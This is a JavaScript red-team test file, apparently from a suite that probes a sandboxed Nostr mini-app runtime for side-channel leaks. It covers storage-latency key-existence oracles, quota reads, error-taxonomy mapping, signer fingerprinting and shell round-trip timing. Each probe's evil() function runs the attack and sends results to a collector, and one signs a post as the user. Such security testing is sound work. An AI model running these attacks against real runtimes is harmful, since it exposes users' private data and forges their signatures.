// evil-06 — side-channel oracles (tier 3). NIP-5D explicitly does NOT protect
// against side channels; this napplet measures what leaks anyway through the
// shell-mediated boundary: storage key existence by latency, quota, the
// error taxonomy (which maps ACL boundaries), and signer backend behavior.

// NAP-STORAGE (napplet/naps#3) names the injected methods getItem/setItem/
// removeItem/keys (getItem → null on a miss). A shell exposing only the
// pre-spec get/set/remove gets an explicit na naming that shape instead of a
// TypeError mid-probe; the wire (storage.get/.set/.remove/.keys) is unchanged.
function preSpecStorage(st) {
  if (typeof st.getItem === 'function') return null;
  const legacy = ['get', 'set', 'remove'].filter((k) => typeof st[k] === 'function');
  return 'storage domain is not NAP-STORAGE shaped (no getItem' + (legacy.length ? '; pre-spec ' + legacy.join('/') + ' only' : '') + ') — probe not run';
}

// napplet/evil#4: a shell that rate-limits mediated calls answers every
// over-budget request with the same limiter error. Timing those rejections, or
// classifying them as a taxonomy, measures the limiter instead of the oracle.
// So the sweep is paced (≤ 7 calls/s), limiter rejections are never timed or
// classified, and a limited case backs off once before it's retried.
const EVIL06_SAMPLE_GAP_MS = 150;
const EVIL06_LIMIT_BACKOFF_MS = 3500;
const EVIL06_LIMITER = /rate.?limit|too many requests|throttl|burst|busy/i;

function evil06Pause(ms) { return new Promise((resolve) => setTimeout(resolve, ms)); }

// Median latency over the samples the shell actually served. Non-limiter
// errors are timed (a fast rejection is still an answer); limiter rejections
// are counted and skipped, with one backoff on the first.
async function timeKey(key, samples) {
  const st = window.napplet && window.napplet.storage;
  const times = [];
  let limited = 0;
  for (let i = 0; i < samples; i++) {
    if (i) await evil06Pause(EVIL06_SAMPLE_GAP_MS);
    const t = performance.now();
    try { await st.getItem(key); } catch (e) {
      if (EVIL06_LIMITER.test(errMsg(e))) {
        if (!limited++) await evil06Pause(EVIL06_LIMIT_BACKOFF_MS);
        continue;
      }
    }
    times.push(performance.now() - t);
  }
  const median = times.length ? times.sort((a, b) => a - b)[Math.floor(times.length / 2)] : NaN;
  return { median: median, served: times.length, limited: limited };
}

// One error-taxonomy case → a comparable outcome signature. Errors keep their
// message, so identical errors collapse into one signature. A limiter
// rejection is retried once after a backoff, then reported as `limited`.
async function taxonomyCase(fn) {
  for (let attempt = 0; ; attempt++) {
    try {
      const v = await fn();
      return { sig: v === undefined ? 'ok' : 'resolved ' + (v === null ? 'null' : typeof v) };
    } catch (e) {
      const msg = errMsg(e);
      if (!EVIL06_LIMITER.test(msg)) return { sig: 'error ' + msg };
      if (attempt) return { limited: msg };
      await evil06Pause(EVIL06_LIMIT_BACKOFF_MS);
    }
  }
}

async function runTaxonomy(st) {
  const cases = {
    'get-missing': () => st.getItem('__evil06_missing__' + randId()),
    'set-oversized': async () => { await st.setItem('__evil06_big__', 'x'.repeat(600 * 1024)); await st.removeItem('__evil06_big__'); },
    'set-ok': async () => { await st.setItem('__evil06_probe__', '1'); await st.removeItem('__evil06_probe__'); },
  };
  const results = [];
  for (const name of Object.keys(cases)) {
    results.push(Object.assign({ name: name }, await taxonomyCase(cases[name])));
  }
  return results;
}

const ATTACKS = [
  {
    id: 'storage-timing',
    name: 'storage key-existence oracle',
    target: 'NAP-STORAGE mediated get: hit vs miss latency',
    severity: 'critical',
    harm: 'Occupied and empty keys answer measurably differently — key EXISTENCE is readable through the ACL boundary by latency, mapping every namespace the runtime tries to hide.',
    evilBrief: 'Runs a high-sample timing sweep (existing vs missing keys) and exfiltrates the measured timing model to the collector — the oracle turns into a full key-existence map.',
    async demo() {
      const st = window.napplet && window.napplet.storage;
      if (!st) return na('no injected storage domain — no mediation to time');
      const gap = preSpecStorage(st);
      if (gap) return na(gap);
      const hitRun = await timeKey('__evil06_seeded__', 12);
      const missRun = await timeKey('__evil06_missing__' + randId(), 12);
      const limits = 'served ' + hitRun.served + '+' + missRun.served + '/24, ' + (hitRun.limited + missRun.limited) + ' rate-limited';
      if (hitRun.served < 6 || missRun.served < 6) {
        return na('too few served samples to time (' + limits + ') — the shell rate limiter answered instead; oracle not measured');
      }
      const hit = hitRun.median;
      const miss = missRun.median;
      const delta = hit - miss;
      return delta > 8
        ? armed('timing oracle: existing key ~' + Math.round(hit) + 'ms vs missing ~' + Math.round(miss) + 'ms (Δ' + Math.round(delta) + 'ms; ' + limits + ') — key EXISTENCE readable through latency, key shapes enumerable')
        : na('no measurable separation (Δ' + Math.round(Math.abs(delta)) + 'ms < 8ms; ' + limits + ') — oracle closed on this backend');
    },
    async evil() {
      const st = window.napplet && window.napplet.storage;
      const out = {};
      if (!st) { out.error = 'no injected storage domain'; return out; }
      if (preSpecStorage(st)) { out.error = preSpecStorage(st); return out; }
      const hitRun = await timeKey('__evil06_seeded__', 40);
      const missRun = await timeKey('__evil06_missing__' + randId(), 40);
      out.hit = Math.round(hitRun.median);
      out.miss = Math.round(missRun.median);
      out.limited = hitRun.limited + missRun.limited;
      out.oracle = hitRun.served < 20 || missRun.served < 20 ? 'not measured (rate-limited)'
        : out.hit - out.miss > 8 ? 'key existence readable (Δ' + (out.hit - out.miss) + 'ms)' : 'not separable';
      out.exfil = await sendToCollector('storage-timing-oracle', out);
      return out;
    },
  },
  {
    id: 'quota-estimate',
    name: 'quota oracle',
    target: 'navigator.storage.estimate()',
    severity: 'high',
    harm: 'If estimate() is reachable from the frame, total origin usage/quota is an aggregate read of ALL napplets\' plus the shell\'s private data volume — traffic-analysis for the whole runtime.',
    async demo() {
      if (!navigator.storage || typeof navigator.storage.estimate !== 'function') return blocked('navigator.storage.estimate unavailable');
      try {
        const r = await withTimeout(navigator.storage.estimate(), 2000);
        if (r && r !== 'timeout' && !r.__rejected) {
          return armed('storage.estimate() visible: usage ' + Math.round((r.usage || 0) / 1024) + 'KB / quota ' + Math.round((r.quota || 0) / 1024 / 1024) + 'MB — aggregate private-data volume readable');
        }
        return blocked('estimate() rejected: ' + (r && r.__rejected));
      } catch (e) {
        return blocked(errMsg(e));
      }
    },
    async evil() {
      const out = {};
      try { out.estimate = await navigator.storage.estimate(); } catch (e) { out.error = errMsg(e); }
      out.exfil = await sendToCollector('quota-oracle', out);
      return out;
    },
  },
  {
    id: 'error-taxonomy',
    name: 'error taxonomy oracle',
    target: 'shell error envelopes (storage.get / oversized set)',
    severity: 'high',
    harm: '"no such key" vs "policy denied" vs "too large" vs "not registered" — distinct errors map the runtime\'s ACL boundaries and namespace internals for free.',
    async demo() {
      const st = window.napplet && window.napplet.storage;
      if (!st) return na('no injected storage domain — no error surface to classify');
      const gap = preSpecStorage(st);
      if (gap) return na(gap);
      // Compare what each case actually answered (error messages included),
      // not which case threw: three identical errors are one signature.
      const results = await runTaxonomy(st);
      const seen = results.map((r) => r.name + ': ' + (r.sig || 'rate-limited (' + r.limited + ')')).join(' | ');
      const measured = results.filter((r) => r.sig);
      if (measured.length < 2) return na('rate limiter answered the cases (' + seen + ') — taxonomy not measured');
      const sigs = new Set(measured.map((r) => r.sig));
      const hasError = measured.some((r) => r.sig.indexOf('error ') === 0);
      return sigs.size >= 2 && hasError
        ? armed(sigs.size + ' distinct answers across ' + measured.length + ' cases (' + seen + ') — the error taxonomy maps ACL boundaries')
        : na('undifferentiated answers (' + seen + ') — taxonomy not informative');
    },
    async evil() {
      const st = window.napplet && window.napplet.storage;
      const out = { errors: [] };
      if (!st) { out.error = 'no injected storage domain'; return out; }
      if (preSpecStorage(st)) { out.error = preSpecStorage(st); return out; }
      for (const r of await runTaxonomy(st)) out.errors.push(r.name + ': ' + (r.sig || 'rate-limited (' + r.limited + ')'));
      out.exfil = await sendToCollector('error-taxonomy', out.errors);
      return out;
    },
  },
  {
    id: 'signer-latency',
    name: 'ambient signer behavior',
    target: 'window.nostr (if a shell wrongly provides it)',
    severity: 'high',
    harm: 'If NIP-07 leaked through, getPublicKey/signEvent latency and call patterns fingerprint the signer backend (extension vs remote signer vs ledgers) — recon for follow-on abuse.',
    async demo() {
      const n = findNostr();
      if (!n) return blocked('no ambient window.nostr — signer unreachable (held)');
      if (typeof n.getPublicKey !== 'function') return na('window.nostr present but no getPublicKey — behavior unmeasurable');
      const times = [];
      for (let i = 0; i < 3; i++) {
        const t = performance.now();
        try { await n.getPublicKey(); } catch (_) { /* timed anyway */ }
        times.push(Math.round(performance.now() - t));
      }
      return armed('ambient signer reachable, getPublicKey latency [' + times.join(', ') + ']ms — backend fingerprintable, signer power available');
    },
    async evil() {
      const n = findNostr();
      const out = {};
      if (!n) { out.error = 'no ambient signer'; return out; }
      try { out.pubkey = await n.getPublicKey(); } catch (e) { out.pubkey = errMsg(e); }
      const t = performance.now();
      try {
        out.signed = await n.signEvent({ kind: 1, created_at: Math.floor(Date.now() / 1000), tags: [], content: 'evil-06 red-team: latency-fingerprinted your signer and signed as you.' });
        out.signLatency = Math.round(performance.now() - t) + 'ms';
      } catch (e) { out.sign = errMsg(e); }
      out.exfil = await sendToCollector('signer-behavior', { pubkey: out.pubkey, latency: out.signLatency, signed: out.signed && out.signed.id });
      return out;
    },
  },
  {
    id: 'shell-rtt',
    name: 'shell scheduler RTT probe',
    target: 'postMessage echo round-trip',
    severity: 'high',
    windowLevel: true, // posts window-level to the parent (napplet/evil#3: runs last)
    harm: 'The parent\'s message round-trip is measurable from inside — shell event-loop scheduling (and, in non-site-isolated runtimes, renderer contention) leaks through. Recon channel for the same-process gadgets (see evil-08).',
    async demo() {
      const rtts = await pingRTT(6);
      if (!rtts.length || rtts[0] < 0) return na('no shell echo (no evil.ping round-trip) — channel closed');
      return armed('parent echo RTT measurable: median ' + rtts[Math.floor(rtts.length / 2)].toFixed(1) + 'ms over ' + rtts.length + ' samples — shell scheduler observable from inside');
    },
    async evil() {
      const out = {};
      out.samples = (await pingRTT(40)).map((v) => +v.toFixed(1));
      out.median = out.samples.length ? out.samples[Math.floor(out.samples.length / 2)] : null;
      out.exfil = await sendToCollector('shell-rtt', out);
      return out;
    },
  },
];